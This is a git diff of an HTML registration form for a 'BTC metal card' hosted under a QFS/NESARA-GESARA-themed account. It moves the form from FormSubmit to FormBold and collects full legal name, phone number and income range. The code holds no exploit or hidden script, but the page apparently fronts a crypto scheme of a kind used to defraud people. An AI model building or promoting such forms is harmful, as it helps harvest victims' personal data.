@@ -6,13 +6,14 @@
   <link rel="icon" type="image/png" href="https://github.com/qfsnesaragesara/BTC-METAL-CARD-PAYMENT/blob/main/photo%201.jpg?raw=true">
   <title>Registration Form</title>
   <script src="https://cdn.tailwindcss.com"></script>
-
   <style>
     /* Overlay for submission */
     #overlay {
       position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
       background: rgba(0,0,0,0.5);
       display: flex;
       align-items: center;
@@ -41,22 +42,13 @@
   <div class="max-w-xl mx-auto bg-white p-8 rounded-2xl shadow-lg">
     <h2 class="text-2xl font-bold text-center mb-6">Registration Form</h2>
 
-    <form id="registrationForm"
-          action="https://formsubmit.co/support@qfsnesaragesara.org"
+    <form id="registrationForm" 
+          action="https://formbold.com/s/oW1Ay" 
           method="POST"
           class="space-y-4">
 
-      <!-- Redirect After Submit -->
-      <input type="hidden" name="_next" value="https://qfsnesaragesara.github.io/BTC-METAL-CARD-PAYMENT/success-registration.html">
-
-      <!-- Disable Captcha -->
-      <input type="hidden" name="_captcha" value="false">
-
-      <!-- Email Table Format -->
-      <input type="hidden" name="_template" value="table">
-
-      <!-- Honeypot -->
-      <input type="text" name="_honey" style="display:none">
+      <!-- Redirect after submit -->
+      <input type="hidden" name="redirect" value="https://qfsnesaragesara.github.io/BTC-METAL-CARD-PAYMENT/success-registration.html">
 
       <div>
         <label class="font-semibold">Full Legal Name</label>
@@ -86,7 +78,7 @@
 
       <div>
         <label class="font-semibold">Phone Number</label>
-        <input type="tel" name="Phone Number" required class="w-full mt-1 p-3 border rounded-lg" />
+        <input type="tel" name="Phone" required class="w-full mt-1 p-3 border rounded-lg" />
       </div>
 
       <div>
@@ -103,18 +95,16 @@
         <label class="font-semibold">Annual Income Range</label>
         <select name="Income Range" required class="w-full mt-1 p-3 border rounded-lg">
           <option value="">Select...</option>
-          <option value="$0–$25,000">$0 – $25,000</option>
-          <option value="$25,000–$50,000">$25,000 – $50,000</option>
-          <option value="$50,000–$100,000">$50,000 – $100,000</option>
-          <option value="$100,000+">$100,000+</option>
+          <option value="0–25k">$0 – $25,000</option>
+          <option value="25k–50k">$25,000 – $50,000</option>
+          <option value="50k–100k">$50,000 – $100,000</option>
+          <option value="100k+">$100,000+</option>
         </select>
       </div>
 
-      <button type="submit"
-        class="w-full bg-blue-600 text-white font-semibold p-3 rounded-lg hover:bg-blue-700">
+      <button type="submit" class="w-full bg-blue-600 text-white font-semibold p-3 rounded-lg hover:bg-blue-700">
         Submit Registration
       </button>
-
     </form>
   </div>
 
@@ -122,9 +112,8 @@
     const form = document.getElementById("registrationForm");
     const overlay = document.getElementById("overlay");
 
-    form.addEventListener("submit", function() {
-        overlay.classList.add("show");
-        // IMPORTANT: NO redirect here. FormSubmit handles it.
+    form.addEventListener("submit", function(){
+      overlay.classList.add("show");
     });
   </script>
 
